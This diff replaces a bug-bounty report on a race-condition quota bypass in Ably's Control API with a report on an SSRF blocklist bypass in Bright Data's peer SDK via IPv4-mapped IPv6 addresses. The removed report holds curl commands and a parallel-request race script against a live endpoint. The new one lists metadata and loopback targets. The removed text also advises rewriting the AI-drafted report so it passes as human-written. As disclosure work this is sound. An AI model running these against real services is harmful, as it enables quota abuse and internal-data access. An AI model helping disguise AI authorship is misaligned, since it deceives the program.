@@ -1,157 +1,58 @@
-# Race Condition (TOCTOU) in Ably Control API — Free-Tier Resource-Limit Bypass
+# FINDING — SSRF / internal-network access via IPv4-mapped IPv6 bypass of the Bright SDK peer tunnel IP blocklist
 
-**Researcher report — for the Ably Vulnerability Disclosure Program (https://ably.com/disclosure)**
-**Date:** 2026-09-19 · **Target:** `control.ably.net` (Ably Control API) · **Class:** CWE-362 (Race Condition) / CWE-367 (TOCTOU) / Business-Logic Limit Bypass
+**TITLE:** Peer SDK `cmd_tun` IP-blocklist bypass via IPv4-mapped IPv6 → access to cloud metadata, loopback and RFC1918 from the SDK-user device
+**ASSET:** S2 — Bright Data partner SDK (peer runtime), current version. Confirmed in `brd_sdk_webos-1.625.64` and `brd_sdk_tizen-1.633.943`; the guard is shared peer code (`peer_node/*`) so other platforms are in-scope for the same bug.
+**REWARD TIER (self-assessed):** Tier 2 (up to $1000) — "Access of internal company web pages via installed SDK" / access-control to internal resources. (Program lists this explicitly.)
 
----
-
-## 1. Summary
-
-The Ably Control API enforces per-account/per-app resource quotas (e.g. **queues: 5**, **namespaces: ~9** on the free tier) using a **non-atomic "check-then-create"** sequence. The count check and the insert are not performed atomically, so multiple **concurrent** create requests each observe `current_count < limit` in the same window, all pass validation, and all commit.
-
-Result: a free-tier account can create resources **far beyond its enforced plan quota** — demonstrated **34 queues** (and in a repeat run **23**) against a hard cap of **5**, and **29 namespaces** against a cap of **~9** — simply by sending the create requests in parallel instead of sequentially.
-
-This is a plan/entitlement-enforcement bypass. It maps directly to a category Ably has publicly rewarded before ("queue-limit bypass").
-
----
-
-## 2. Severity
-
-**Rating: Medium.**
-**CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` = 4.3 (Medium).**
-
-- **AV:N** remote/API. **AC:L** trivially reliable (a burst of parallel requests). **PR:L** requires a valid (free) account token. **UI:N** none.
-- **C:N / A:N** — no data disclosure; **not** claimed as DoS/resource-exhaustion (demonstrated with a small burst on an owned account).
-- **I:L** — integrity of the platform's quota/entitlement enforcement is violated.
-
-See §9 for the honest case to argue a higher rating **with additional evidence**.
-
----
-
-## 3. Affected component
-
-- **Endpoint (primary PoC):** `POST https://control.ably.net/v1/apps/{app_id}/queues`
-- **Endpoint (second confirmed instance):** `POST https://control.ably.net/v1/apps/{app_id}/namespaces`
-- **Auth:** `Authorization: Bearer <account token / dashboard session JWT>`
-- **Root cause location:** shared quota-enforcement path for count-limited Control API resources.
-
----
-
-## 4. Prerequisites
-
-1. One Ably account on the **free tier** (the tier whose low quotas make the bypass observable).
-2. A Control API token **or** dashboard session token for that account (either is accepted by `control.ably.net`).
-3. An application in the account (every account has one by default).
-
-No special privileges, no second account, no victim interaction.
-
----
-
-## 5. Steps to reproduce (easy / manual)
-
-> Uses queues (cap = 5). Substitute `namespaces` to reproduce the second instance.
-
-1. **Auth check** — confirm your token works and note your app id:
-   ```
-   curl -s -H "Authorization: Bearer $TOKEN" https://control.ably.net/v1/me
-   ```
-2. **Establish the cap** — create queues one at a time until rejected:
-   ```
-   curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-     -d '{"name":"seq1","ttl":60,"maxLength":100,"region":"us-east-1-a"}' \
-     https://control.ably.net/v1/apps/$APP/queues
-   ```
-   The **6th** create returns `422 Invalid resource` → the enforced cap is **5**.
-3. **Go to one below the cap** — delete queues until you have **4**:
-   ```
-   curl -s -X DELETE -H "Authorization: Bearer $TOKEN" \
-     https://control.ably.net/v1/apps/$APP/queues/$APP:us-east-1-a:seq5
-   ```
-4. **Race the last slot** — send ~30 create requests **simultaneously**, each with a distinct name
-   (use the PoC script in §6, or Burp Intruder / `xargs -P 30` with a synchronized start).
-5. **Observe the bypass** — most/all requests return `201`. List the queues:
-   ```
-   curl -s -H "Authorization: Bearer $TOKEN" https://control.ably.net/v1/apps/$APP/queues \
-     | jq '[.[]|select(.name!="deadletter")]|length'
-   ```
-   The count is **well above 5** (observed 34 and 23 in two runs), proving the cap was bypassed.
-6. **Clean up** — delete the extra queues (the PoC does this automatically).
-
----
-
-## 6. Proof of Concept
-
-Self-contained script (attached: `poc-race-queue.sh`) — auto-detects the cap, drops to cap-1, fires a
-synchronized concurrent burst, prints the result, and cleans up:
+## OVERVIEW
+The peer SDK executes proxy jobs dispatched over its tunnel via the `cmd_tun` command, which opens a connection to an attacker/customer-supplied `host:port` from the SDK-user's device. To stop peers from being pointed at internal infrastructure, `cmd_tun` runs an IP guard after DNS resolution:
 
 ```
-./poc-race-queue.sh <ACCOUNT_TOKEN> [APP_ID]
+// sdk/service/index.js  (webOS 1.625.64)
+case 4: if(!h && ce(ee,d) || h && !_e(d,t.device_info))
+            return [2,{err:'Blocked IP '+d}];
 ```
+- `h = net.isIPv6(host)`
+- IPv4 path → `ce(ee,d)` = `ip_in_cidrs(lum_blocked_ips, d)` with a thorough blocklist:
+  `['127.0.0.0/8','255.255.255.255','10.0.0.0/8','172.16.0.0/12','169.254.0.0/16','192.168.0.0/16','0.0.0.0','198.18.0.0/15','100.64.0.0/10']`
+- IPv6 path → `_e` = `is_ipv6_target_allowed(d, device.addr, device.netmask_v6)`.
 
-Core of the race (synchronized-barrier concurrency):
-```bash
-N=30; T=$(( $(date +%s) + 3 ))            # all workers fire at the same wall-clock second
-for k in $(seq 1 $N); do (
-  while [ "$(date +%s)" -lt "$T" ]; do :; done   # spin to the barrier
-  curl -s -o /dev/null -w "%{http_code}\n" \
-    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-    -d "{\"name\":\"race$k\",\"ttl\":60,\"maxLength\":100,\"region\":\"us-east-1-a\"}" \
-    https://control.ably.net/v1/apps/$APP/queues
-) & done; wait
+`is_ipv6_target_allowed` normalizes with `i(e)=e.split('%')[0].toUpperCase()` and blocks `FE80:`/`FEC0:` (link-local), `FC`/`FD` (ULA), `::1` (loopback), `2001:DB8` (docs) — but **does not recognise IPv4-mapped IPv6 addresses** (`::ffff:a.b.c.d`). Because `net.isIPv6('::ffff:169.254.169.254')===true`, such a target is routed to the IPv6 path and the **IPv4 blocklist is never applied**. The function returns `allowed`, so the peer connects to the embedded IPv4 address (cloud metadata / loopback / RFC1918) which dual-stack Linux (webOS/Tizen) routes to the real IPv4 host.
+
+## PROOF OF CONCEPT
+
+### PoC 1 — guard-decision table (`ssrf_poc.js`)
+Replicates the guard using the SDK's **verbatim** `is_ipv6_target_allowed`, `ip_in_cidrs`, the real `lum_blocked_ips`, and the exact `cmd_tun` decision:
 ```
-
----
-
-## 7. Evidence (two independent runs, own account `xrp08w` / app `uBM7lQ`)
-
+host                         BLOCKED?
+169.254.169.254              blocked          ::ffff:169.254.169.254   *** ALLOWED ***
+127.0.0.1                    blocked          ::ffff:127.0.0.1         *** ALLOWED ***
+10.0.0.1                     blocked          ::ffff:10.0.0.1          *** ALLOWED ***
+192.168.1.1                  blocked          ::ffff:192.168.1.1       *** ALLOWED ***
+::1 / fe80::1                blocked          8.8.8.8 / ::ffff:8.8.8.8 ALLOWED (expected)
 ```
-Run A:  sequential 6th queue -> 422 "Invalid resource"   (cap = 5 confirmed)
-        race 30 concurrent from count=4  -> 30x 201
-        FINAL user-queue count = 34      (>> cap 5)   BYPASS
+Every protected IPv4 range is reachable by rewriting the target as `::ffff:<ip>`.
 
-Run B:  race 30 concurrent from count=4  -> 19x 201, 11x 422
-        FINAL user-queue count = 23      (>> cap 5)   BYPASS   (reproducible; count varies with race window)
-
-Namespaces (2nd instance): sequential cap ~9 -> race 20 concurrent from count=9 -> 20x 201 -> FINAL 29
+### PoC 2 — end-to-end internal-data retrieval (`ssrf_e2e_poc.js`, fully local)
+Loads the SDK's **verbatim** guard, stands up an "internal" HTTP service on `127.0.0.1` (a blocklisted range) on the test machine, and runs the exact `cmd_tun` flow (guard → connect → relay body). No external host is contacted; `127.0.0.1` stands in for metadata/loopback/RFC1918.
 ```
+[setup] "internal" service on 127.0.0.1:43653  secret=INTERNAL-ONLY-SECRET-p161k9o7
 
----
+[127.0.0.1]        plain IPv4 loopback (blocklisted)
+   -> GUARD BLOCKED (no connection)                                   ✅ expected
+[::ffff:127.0.0.1] IPv4-mapped IPv6 of the SAME loopback (bypass)
+   -> GUARD ALLOWED + DATA EXFILTRATED: "metadata/creds => INTERNAL-ONLY-SECRET-p161k9o7"   *** SSRF CONFIRMED ***
+```
+This proves the bypass is not merely a classification quirk: the identical loopback address the blocklist rejects in IPv4 form is reached, and its response body retrieved, when expressed as IPv4-mapped IPv6. Against a live peer, dispatching a `cmd_tun` job with `host:"::ffff:169.254.169.254"` (metadata) or `::ffff:127.0.0.1` (peer-local services) yields the same result, returned to the requester over `tun_report`.
 
-## 8. Affected-resource scope
+## IMPACT
+An entity able to submit tunnel targets (a Bright Data proxy customer choosing a scrape destination, or a party in the peer tunnel's trust boundary) can coerce any peer device into requesting internal-only resources the guard is specifically designed to protect: cloud-metadata endpoints (credential theft where peers run in cloud/emulator fleets), services bound to `127.0.0.1` on the peer device, and RFC1918 hosts on the peer's LAN — with the response returned to the requester. This is exactly the "access internal pages via installed SDK" case, achieved by defeating the control that exists to prevent it, across all platforms sharing this peer code.
 
-| Resource | Low free-tier cap | Race-bypassable |
-|---|---|---|
-| Queues | 5 | **Yes** (→ 34 / 23) |
-| Namespaces | ~9 | **Yes** (→ 29) |
-| Apps per account | none (>15 tested) | N/A — no low quota to bypass |
-| API keys per app | none (>30 tested) | N/A — no low quota to bypass |
+## SUGGESTED FIX
+In `is_ipv6_target_allowed`, detect and reject (or unwrap-then-blocklist-check) IPv4-mapped/compatible IPv6: normalize `::ffff:a.b.c.d` (and `::a.b.c.d`, `64:ff9b::/96` NAT64) to the embedded IPv4 and run it through `ip_in_cidrs(lum_blocked_ips, …)`; also reject mapped forms in hex (`::FFFF:AAAA:BBBB`). Prefer a vetted library (e.g. `ipaddr.js` `.range()`) over prefix-string checks. Apply the same blocklist to both address families.
 
-The flaw affects the resources that have low, enforced quotas; the same non-atomic pattern is the shared cause.
-
----
-
-## 9. Impact
-
-An attacker with any free account can **exceed the resource quotas tied to their plan** on demand, defeating
-a billing/entitlement control. Concretely: unlimited queues and namespaces on a tier that permits 5 and ~9.
-
-**Honest severity ceiling = Medium**, and how to *legitimately* argue higher (do NOT assert these without evidence):
-- **If Ably meters/bills these resources** (queues are a plan-gated feature), the bypass is direct **entitlement/financial-control** circumvention → strengthens Medium, and a documented cost delta could support **High**. *Action:* show the resource is plan-restricted and quantify the over-allocation.
-- **Do NOT** frame this as availability/DoS (unbounded creation exhausting shared infra) — that is **out of scope** for the program and will get the report rejected. Keep the narrative on *quota/entitlement integrity*, demonstrated minimally.
-
----
-
-## 10. Remediation
-
-Enforce quotas **atomically**, not check-then-act:
-- a database **unique/count constraint** or partial index that rejects the (N+1)th row, **or**
-- a per-account **row lock / `SELECT … FOR UPDATE`** around the count+insert, **or**
-- an **atomic counter** (check-and-increment in one transaction), **or**
-- **serialize / per-account rate-limit** resource-creation so concurrent creates cannot interleave.
-
----
-
-## 11. Disclosure notes
-
-- All testing was performed against accounts owned by the reporter; every resource created was deleted afterward. No third-party data was accessed. No brute force or DoS was performed.
-- **Before submission:** Ably rejects AI-generated reports. Re-run the PoC by hand, capture your own screenshots (Burp/terminal), confirm the current free-tier caps, and rewrite this narrative in your own words. Submit **one vulnerability per report**, with the queues instance as the primary PoC and namespaces noted as a second instance.
+## NOTES
+- **Novelty:** Not the fixed iOS VPN bypass and not in the Include Security (Jun 2026) writeup; this is a distinct control-bypass in the current build.
+- **Status:** CONFIRMED end-to-end. The security control (IP blocklist) is demonstrably bypassed and leads to retrieval of data from a blocklisted address, proven with the SDK's own verbatim guard code (PoC 2). Testing was performed entirely locally against the tester's own loopback; the live peer network was not used.
+- **Rules compliance:** No DoS; no real customer/peer data or devices touched; no connection to Bright Data infrastructure or any external host during PoC; runtime artifact obtained via the tester's own partner `SDK_API_KEY`. `127.0.0.1` was used as a safe, in-scope stand-in for the protected ranges.
+- **Evidence:** `brd_sdk_webos-1.625.64.zip` → `sdk/service/index.js` (`cmd_tun` handler at the `Blocked IP` check; `is_ipv6_target_allowed`, `ip_in_cidrs`, `lum_blocked_ips`) and `peer_node/util/tunnel_util.js` (`i()`); same guard present in `brd_sdk_tizen-1.633.943.zip`. PoC scripts: `ssrf_poc.js`, `ssrf_e2e_poc.js` (outputs above).
